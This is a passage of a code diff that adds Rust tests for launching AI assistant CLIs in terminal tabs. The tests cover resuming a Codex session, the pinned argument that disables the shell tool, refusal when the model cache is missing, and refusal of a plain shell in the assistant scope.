+        std::fs::create_dir_all(home.path().join(".codex")).unwrap();
+        std::fs::write(home.path().join(".codex").join("models_cache.json"), crate::services::assistant::test_support::codex_cache(&["x"])).unwrap();
+        let live = "019ea7c8-b7d5-7a13-80e2-1ad6608db5e6";
+        let resolver = |mut opts: PtyOptions| {
+            assert!(opts.args.is_empty(), "the resolver is handed an empty argv, which it would replace");
+            opts.args = vec!["resume".to_string(), live.to_string()];
+            opts
+        };
+        let mut codex = chat_opts(AssistantCli::Codex, None);
+        let codex_plan = plan(&mut codex);
+        let claim = assemble_assistant_launch_with(&mut codex, &codex_plan, home.path(), None, &resolver).unwrap();
+        assert!(claim.is_some(), "the resume target is claimed for this tab");
+        let at = codex.args.iter().position(|a| a == "resume").expect("resume kept");
+        assert_eq!(codex.args[at + 1], live);
+        assert_eq!(codex.args.len(), at + 2, "resume is last: global -c overrides come before the subcommand");
+        assert!(codex.args.iter().any(|a| a == "features.shell_tool=false"));
+        drop(claim);
+        // A fresh Codex chat has just the pinned arguments.
+        let mut fresh = chat_opts(AssistantCli::Codex, None);
+        let fresh_plan = plan(&mut fresh);
+        assemble_assistant_launch_with(&mut fresh, &fresh_plan, home.path(), None, &identity).unwrap();
+        assert!(!fresh.args.iter().any(|a| a == "resume") && fresh.args.iter().any(|a| a == "features.shell_tool=false"));
+
+        // The profile's refusal is the spawn's: a Codex home with no model cache.
+        let bare = tempfile::tempdir().unwrap();
+        let mut refused = chat_opts(AssistantCli::Codex, None);
+        let refused_plan = plan(&mut refused);
+        let err = assemble_assistant_launch_with(&mut refused, &refused_plan, bare.path(), None, &identity).err().expect("refused");
+        assert_eq!(err, Refusal::CodexCatalog.to_string());
+    }
+
+    #[tokio::test]
+    async fn prepare_refuses_a_plain_shell_in_the_assistant_scope() {
+        let mut opts = chat_opts(AssistantCli::Claude, None);
+        opts.assistant = None;
+        opts.cmd = String::new();
+        opts.cwd = "/tmp".into();
+        let err = prepare(opts, None, None).await.err().expect("refused");
+        assert!(err.contains("needs its launch"), "{err}");
     }
 }
